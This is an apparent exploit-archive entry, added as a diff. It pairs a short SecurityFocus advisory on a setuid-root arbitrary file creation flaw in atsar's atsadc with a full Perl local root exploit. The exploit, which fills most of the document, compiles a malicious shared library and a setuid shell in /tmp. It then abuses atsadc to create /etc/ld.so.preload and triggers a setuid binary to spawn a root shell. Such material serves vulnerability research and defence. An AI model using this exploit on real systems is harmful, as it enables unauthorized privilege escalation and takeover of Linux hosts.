@@ -1,0 +1,67 @@
+source: http://www.securityfocus.com/bid/1048/info
+
+atsar is a linux load monitoring software package released under the GPL by AT Computing. atsadc is a setuid root binary that is included in the atsar package. atsadc is setuid because it obtains informatin via /dev/kmem. atsadc will accept as an argument an output file, which it will open -- without checking to make sure the user executing atsadc has the priviliges to do so. After it has opened and created (or overwritten) the target file as root, the permissions set on the file will allow the attacker to write to it. Since this file is arbitrary, it is possible to gain root locally in any number of ways through creating malicious system files. In Teso's proof of concept exploit, root priviliges are gained by creating a malicious shared library to be preloaded and creating/specifying that library in /etc/ld.so.preload (and then executing a setuid binary..).
+
+Starting with atsar 1.5 the program is no longer suid root as it obtains its information via the /proc file system.
+
+#!/usr/bin/perl
+
+# Halloween 4 local root-exploit, other distros are maybe
+# affected as well. (atsadc program)
+# (C) 2000 C-skills development, S. Krahmer under the GPL
+# http://www.cs.uni-potsdam.de/homepages/students/linuxer
+
+# Exploit will create /etc/ld.so.preload, so it should NOT exist
+# already. THIS FILE WILL BE LOST!
+
+# ! USE IT AT YOUR OWN RISK !
+# For educational purposes only.
+
+print "Creating hijack-lib ...\n";
+open O, ">/tmp/boom.c" or die "open(boom.c..)";
+print O<<_EOF_;
+#include <sys/types.h>
+
+int time(void *v)
+{
+	chown("/tmp/boomsh", 0, 0);
+	chmod("/tmp/boomsh", 06755);
+	unlink("/etc/ld.so.preload");
+	exit(1);
+}
+_EOF_
+close O;
+
+print "Compiling hijack-lib ...\n";
+$foo = `cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`;
+$foo = `cc -shared /tmp/boom.o -o /tmp/boom.so`;
+
+open O, ">/tmp/boomsh.c" or die "open(boomsh.c ...)";
+print O<<_EOF2_;
+#include <stdio.h>
+int main() 
+{
+    char *a[] = {"/bin/sh", 0};
+    setuid(0); setregid(0, 0);
+    execve(a[0], a, 0);
+    return 0;
+}
+_EOF2_
+close O;
+
+print "Compile shell ...\n";
+$foo = `cc /tmp/boomsh.c -o /tmp/boomsh`;
+
+umask 0;
+
+print "Invoking vulnerable program (atsadc)...\n";
+$foo = `atsadc 2 1 /etc/ld.so.preload`;
+open O, ">/etc/ld.so.preload" or die "Huh? Can't open preload.";
+print O "/tmp/boom.so";
+close O;
+$foo = `/usr/bin/passwd`;
+
+# let it look like if we have sth. to do. :)
+sleep 3;
+print "Welcome. But as always: BEHAVE!\n";
+system("/tmp/boomsh");
